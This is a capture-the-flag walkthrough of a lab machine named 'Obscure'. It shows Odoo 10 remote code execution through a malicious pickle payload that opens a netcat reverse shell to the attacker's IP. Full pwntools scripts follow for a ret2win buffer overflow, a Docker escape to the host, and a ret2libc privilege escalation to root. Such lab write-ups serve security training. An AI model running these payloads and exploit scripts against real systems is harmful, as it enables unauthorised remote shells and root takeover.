# Obscure

### Obscure
Nmap scan shows ports 21,22 and 80 open.<br />
The ftp server contains the two following files:<br />
![image](https://github.com/user-attachments/assets/e5dad07a-78b6-48b7-87af-27f4ae8e6faf)<br />
So now I know that a possible domain name might be `antisoft.thm`. Let's see this ELF file how it works. <br />
![image](https://github.com/user-attachments/assets/41de072b-792d-44a5-a00d-b4f63d72b7b0)<br />
The good new is that an ID is hardcoded in the program, if I run the `strings` command:<br />
![image](https://github.com/user-attachments/assets/59f1133a-487b-4db1-a884-de973692c329)<br />
This gets me a password:<br />
![image](https://github.com/user-attachments/assets/41b4c27b-b884-42fa-88d9-810103422cc6)<br />
With this password I'm able to download a backup of the database of the website. To do that go to `http://10.10.188.107/web/database/manager`, click on `backup` and prompt the found password. I unzip the downloaded file and it contains some interesting stuff, for example a manifest:<br />
![image](https://github.com/user-attachments/assets/7230a5db-0d5a-4fcc-815f-742ae8f0e07d)<br />
Also, after a while I remembered I had found the domain `antisoft.thm`, so I try to log in with the password I found earlier and username `admin@antisoft.thm` and it worked!. Now that I'm in, since from the manifest I saw that the version of Odoo running is 10.0, I did some reaserch and found this [authenticated remote execution](https://www.exploit-db.com/exploits/44064) vulnerability.<br />
So I follow the steps written in the POC. First search for and install `Database Anonymization`:<br />
![image](https://github.com/user-attachments/assets/9280033c-f333-4a7c-9e44-abd01f8d623b)<br />
Now go on `settings` and click `Anonymize Database`:<br />
![image](https://github.com/user-attachments/assets/cd54e119-cf91-4b92-8e27-c763077c8b37)<br />
Click on `Anonymize Database` button. Now refresh the page again:<br />
![image](https://github.com/user-attachments/assets/ded3667e-7f04-4367-aee9-d72baa9217bd)<br />
On this window we want to first upload a malicious `.pickle` file and then click on `Reverse database Anonymization`. The pickle file I'm going to upload is this:

    import pickle
    import base64
    
    class Exploit(object):
        def __reduce__(self):
            return (eval, ("__import__('os').system('nc 10.11.127.156 9001 -e /bin/sh') or ['ok']",))
    
    # Serialize the object with pickle
    payload = pickle.dumps(Exploit(), protocol=2)
    
    # Optional: base64 encode (if needed for HTTP transport)
    encoded = base64.b64encode(payload)
    
    # Save to file
    with open("payload.pickle", "wb") as f:
        f.write(payload)
    
    print("[+] Payload written to payload.pickle")
Execute this python script and it will write a payload on a file called `payload.pickle`. So I upload the file and get the reverse shell! This gets me the first flag located at `/var/lib/odoo`. Once on the system, it welcomes me with a set of database credentials!<br />
![image](https://github.com/user-attachments/assets/ba506af2-e09a-4266-82f7-04a3576372a3)<br />
The presence of a file `.dockerenv` in `/` suggets me that I'm in a docker container. I need to escape. First I need to become root on the container. So I try to connect to the DB with `psql -h db -U odoo -d postgres` using this credentials, but they are wrong. But since the script suggests that these credentials are stored in environment variables, I run `env` to see them:<br />
![image](https://github.com/user-attachments/assets/f645c1b5-8a37-4622-bc14-85df7c846e76)<br />
Infact the password is different.<br />
At this point I was stuck for a while so I decided to run linpeas, and it finds a SUID binary actually inside `/`, the root directory, which I didn't notice initially. I think I need to exploit this to become root.<br />
![image](https://github.com/user-attachments/assets/2497a4b4-24db-442d-a670-77a354622cf5)<br />
Given the description of this room I think I have to perform a buffer overflow attack. So I transfer the binary on my kali machine and execute checksec to see what defenses are enabled:<br />
![image](https://github.com/user-attachments/assets/bad01232-2c13-4386-85f4-c389915a196b)<br />
Just NX is enabled, meaning that I can't execute shellcode on the stack. Analyzing the binary with ghidra, I can see that there's a `win` function that executes the shell. I want to return to this function. So I use pwndbg to find the address of the win function (it stays always the same because the binary is not PIE, meaning that is not affected by ASLR).<br />
![image](https://github.com/user-attachments/assets/41ed1935-23fc-4750-a491-514010649b60)<br />
So the address of `win` is `0x0000000000400646`. Now I need to find the offset that overwrites the RIP. I use the following pwntools script:<br />
from pwn import *

    io = process('./ret')
    io.recvline()
    io.sendline(cyclic(500))
    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)
    info("rip offset is %d", rip_offset)
![image](https://github.com/user-attachments/assets/d198c59c-d951-4d1e-8c86-9173cefceeea)<br />
The following pwntools script exploits the binary in my local machine: <br />
   
    from pwn import *
    
    p = process("./ret")
    
    offset = 136
    rip = p64(0x0000000000400646)
    print(rip)
    ret_gadget = p64(0x00000000004006d2)
    
    payload = b"A"*offset
    payload += ret_gadget
    payload += rip
    
    p.recv()
    p.sendline(payload)
    p.interactive()
(notice that I also had to take the address of a ret instruction in order to solve stack alignment issues).<br />
Now I need to copy the payload in a way that I can exploit it in the target machine (since it doesnt have pwntools). And this is the final payload:

    { python2 -c 'print "A" * 128 + "\xd2\x06\x40\x00\x00\x00\x00\x00\x46\x06\x40\x00\x00\x00\x00\x00"'; cat; } | /ret
I honestly don't know why the offset changed from 136 to 128 bytes, but it's worth trying, maybe the compiler in the target machine layed out variables on the stack in a different order. I am now root in the docker container, but the flag isn't in the `/root` directory. It's time to escape. So If I do `ip a`, I can see that the IP for the docker container is `172.17.0.3`. No always, but sometimes the container can communicate with the host machine through the "gateway" of this interface, which is `172.17.0.1`. It seems like there's something there, since it responds to the pings. What I do next is I donwload a static version on `nmap` from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap), and I transfer it to the target machine. I use it on the IP of the host machine and look what I get: <br />
![image](https://github.com/user-attachments/assets/d8d18464-1cae-4e8a-ae95-166f92ffb5b2)<br />
There's a port 4444 open, which I didn't see in the nmap scan from my kali machine. Maybe this Port is open only for the docker container. The funny thing is that it's exactly the binary that I just exploited, but it's remote instead of local! To exploit it and get a remote shell, I just need to run `{ python2 -c 'print "A" * 128 + "\xd2\x06\x40\x00\x00\x00\x00\x00\x46\x06\x40\x00\x00\x00\x00\x00"'; cat; } | nc 172.17.0.1 4444`. This gets me access to the host machine as user `zeeshan`, and I get the user.txt flag. I find rsa key inside his .ssh folder so I used to get ssh login so that the shell is a bit more stable. Next, I run `sudo -l` and get this output:<br />
![image](https://github.com/user-attachments/assets/18c974b4-6e2b-400a-8876-665cfe43d0f4)<br />
There's another file to exploit with a buffer overflow! Let's exploit it, first I transfer it locally, then I find the offset with the same script I used before:<br />
![image](https://github.com/user-attachments/assets/68e9f4ec-9f11-42a8-97a5-0152f32c685f)<br />
It's 40 bytes. The defenses are the same of the previous binary, but this time there's no `win` function. This is a ret2libc attack. The following code exploits the binary on my local machine: <br />
    
    from pwn import *
    
    elf = context.binary = ELF("./exploit_me")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    
    p = process()
    
    rop = ROP(elf)
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]  # single ret (for alignment / CET)
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main = elf.sym['main']
    
    log.info(f'pop rdi: {hex(pop_rdi)}')
    log.info(f'puts@plt: {hex(puts_plt)}')
    log.info(f'puts@got: {hex(puts_got)}')
    log.info(f'main: {hex(main)}')
    
    offset = 40
    
    payload1 = flat(
        b'A' * offset,
        ret,
        pop_rdi,
        puts_got,
        puts_plt,
        main
    )
    
    p.recvuntil(b"root!")
    p.recvline()
    
    p.sendline(payload1)
    
    puts_leak = u64(p.recv(6) + b'\x00\x00')
    log.success(f'Leaked puts@libc: {hex(puts_leak)}')
    
    libc_base = puts_leak - libc.symbols['puts']
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    
    log.success(f'libc base: {hex(libc_base)}')
    log.success(f'system: {hex(system)}')
    log.success(f'/bin/sh: {hex(bin_sh)}')
    
    payload2 = flat(
           b'A' * offset,
           ret,
           ret,
           pop_rdi,
           bin_sh,
           system
       )
    p.recvuntil(b"root!")
    p.recvline()
    p.sendline(payload2)
    p.interactive()

Now the problem is that the target machine doesn't have pwntools. However I can bypass this problem since I have ssh access to the target machine, and thank god python is a champ. I can set the context of the remote binary, by authenticating with ssh and then set the target process to be a remote one with the command `sudo /exploit_me`. Also, remember to copy the actual libc from the binary itself into your host machine and use that library on the pwntools script. Even one small difference in the library can f**k up the exploit. The final script that exploits the remote buffer overflow is the following: 

    from pwn import *
    
    libc = ELF("libc.so.6")
    
    s = ssh(host='10.10.116.6',user='zeeshan',keyfile='id_rsa_zeeshan')
    p = s.process('/home/zeeshan/exploit_me')
    
    elf = context.binary = p.elf
    rop = ROP(elf)
    
    p = s.process(argv='sudo /home/zeeshan/exploit_me',shell=True)
    
    rop = ROP(elf)
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]  # single ret (for alignment / CET)
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main = elf.sym['main']
    
    offset = 40
    
    payload1 = flat(
        b'A' * offset,
        ret,
        pop_rdi,
        puts_got,
        puts_plt,
        main
    )
    
    p.recvuntil(b"root!")
    p.recvline()
    
    p.sendline(payload1)
    
    puts_leak = u64(p.recv(6) + b'\x00\x00')
    
    libc_base = puts_leak - libc.symbols['puts']
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))
    
    
    payload2 = flat(
           b'A' * offset,
           ret,
           ret,
           pop_rdi,
           bin_sh,
           system
       )
    p.recvuntil(b"root!")
    p.recvline()
    p.sendline(payload2)
    p.interactive()
